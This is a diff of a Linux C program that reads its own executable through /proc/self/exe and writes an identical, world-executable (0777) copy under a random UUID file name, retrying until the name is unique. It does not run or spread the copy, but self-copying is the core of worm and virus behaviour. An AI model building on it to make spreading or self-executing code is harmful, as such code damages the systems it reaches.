@@ -1,11 +1,13 @@
 #ifdef __linux__
-
+  
+  #include <linux/limits.h>
   #include <stdio.h>
   #include <uuid/uuid.h>
   #include <unistd.h>
-  #include <limits.h>
   #include <string.h>
   #include <stdlib.h>
+  #include <fcntl.h>
+  #include <errno.h>
 
   void genFileName(char* fileName, size_t fileNameSize){
     if(fileNameSize<37){
@@ -22,23 +24,38 @@
     snprintf(fileName, sizeof(uuidStr), "%s", uuidStr);
   }
 
-  void getSelfFilePath(char** out){
-    char path[PATH_MAX];
+  void getSelfFilePath(char* out, size_t outSize){
+    if(outSize == 0){
+      fprintf(stderr, "outSize must be greater than 0!\n");
+      return;
+    }
     ssize_t len;
 
-    len = readlink("/proc/self/exe", path, sizeof(path)-1);
+    len = readlink("/proc/self/exe", out, outSize-1);
     if(len == -1){
       perror("Reading own file name failed.");
-      *out = NULL;
+      out[0] = '\0';
       return;
     }
 
-    path[len] = '\0';
-    *out = path;
+    out[len] = '\0';
   }
 
-  void genFile(unsigned char* content, size_t contentLength, char* fileName){
-    FILE* file = fopen(fileName, "wb");
+  void genFile(unsigned char* content, size_t contentLength, char* fileName, int* fileUni){
+    int fd = open(fileName, O_WRONLY | O_CREAT | O_EXCL, 0777);
+    if(fd==-1){
+      if(errno == EEXIST){
+        perror("File being created already exists.");
+        *fileUni = 0;
+        return;
+      } else{
+        perror("Error creating file descriptor.");
+        return;
+      }
+    }
+    *fileUni = 1;
+
+    FILE* file = fdopen(fd, "wb"); 
 
     if(file == NULL){
       char errMessage[strlen(fileName)+50];
@@ -55,38 +72,67 @@
     fclose(file);
   }
 
-  void readFileContent(unsigned char** fileContent, const char* path){
+  void readFileContent(unsigned char** fileContent, const char* path, size_t* fileLength){
     FILE* binary = fopen(path, "rb");
 
     if(binary == NULL){
       char errMessage[strlen(path)+50];
       snprintf(errMessage, sizeof(errMessage), "Reading file %s failed.", path);
+      *fileContent = NULL;
       perror(errMessage);
       return;
     }
-
+    
     fseek(binary, 0, SEEK_END);
-    size_t fileLength = ftell(binary);
-
-    unsigned char* binaryContent = (unsigned char*)malloc(fileLength*sizeof(unsigned char));
-
-    fseek(binary, 0, SEEK_SET);
-    for(long i = 0; i < fileLength; ++i){
-      binaryContent[i] = fgetc(binary);
+    long tmp = ftell(binary);
+    if(tmp<0){
+      perror("Error finding file length.");
+      *fileContent = NULL;
+      return;
     }
+    *fileLength = tmp;
+    fseek(binary, 0, SEEK_SET);
+
+    unsigned char* binaryContent = (unsigned char*)malloc(*fileLength*sizeof(unsigned char));
+    fread(binaryContent, sizeof(unsigned char), *fileLength, binary);
     fclose(binary);
 
     *fileContent = binaryContent;
   }
 
   int main(void){
-    char fileName[37];
-    genFileName(fileName, 37);
-    if(fileName[0]=='\0'){
+    //get executable path
+    char selfPath[PATH_MAX];
+    getSelfFilePath(selfPath, sizeof(selfPath));
+    if(selfPath[0]=='\0'){
       return -1;
     }
 
+    //now read self
+    unsigned char* fileContent;
+    size_t fileLength;
+    readFileContent(&fileContent, selfPath, &fileLength);
+    if(fileContent==NULL){
+      return -1;
+    }
 
+    //file creation loop where it trys creating a file with a unique name
+    int trying = 1;
+    int fileUni = 1;
+    while(trying){
+      char fileName[37];
+      genFileName(fileName, sizeof(fileName));
+      if(fileName[0]=='\0'){
+        return -1;
+      }
+      
+      genFile(fileContent, fileLength, fileName, &fileUni);
+      if(fileUni){
+        trying=0;
+      }
+    }
+    //clean up
+    free(fileContent);
     return 0;
   }
 
